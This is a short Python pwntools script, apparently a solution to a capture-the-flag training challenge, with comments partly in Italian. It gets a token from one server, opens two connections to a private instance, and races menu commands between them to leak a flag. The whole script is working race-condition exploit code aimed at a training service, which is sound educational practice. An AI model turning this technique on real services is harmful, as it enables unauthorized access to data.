from pwn import *

def get_token(c):
    c.recvuntil(b"token: ")       # Quando facciamo la prima connessione, ci viene stampato: "Initialized  private instance with token: 3c8..." so we read till "token "
    return c.recvline().strip()   # We read until the end of the line (so we read <token_value>\n) and we do .strip() to remove the \n -> we return the token value


def get_flag(c):
    c.recvline()                   # Here we read the username
    return c.recvline().strip()    # Here we read the password and return it (so, the flag)

#first connection is to the server that gives us the token 
c_token = remote("swiss.training.offensivedefensive.it", 8080, ssl=True)
token = get_token(c_token)
c_token.close()                    # we can close the connection to the server to get the token
#print(token)

# Now we connect to our private process instance for the real challenge
c_1 = remote("private.training.offensivedefensive.it", 8080, ssl=True)  # first thread
c_1.recvuntil(b"Token: ")                                               # we will be asked the token, so we send it
c_1.sendline(token)
c_2 = remote("private.training.offensivedefensive.it", 8080, ssl=True)  # second thread
c_2.recvuntil(b"Token: ")                                               # we will be asked the token, so we send it
c_2.sendline(token)



while(1): 
    
    c_1.recvuntil(b"\t4 - Execute the command chain\n")
    c_2.recvuntil(b"\t4 - Execute the command chain\n")

    c_1.sendline(b"1")
    c_1.recvuntil(b"> ")
    c_1.sendline(b"f")
    c_2.sendline(b"4")
    
    print(get_flag(c_2)[:55]) 





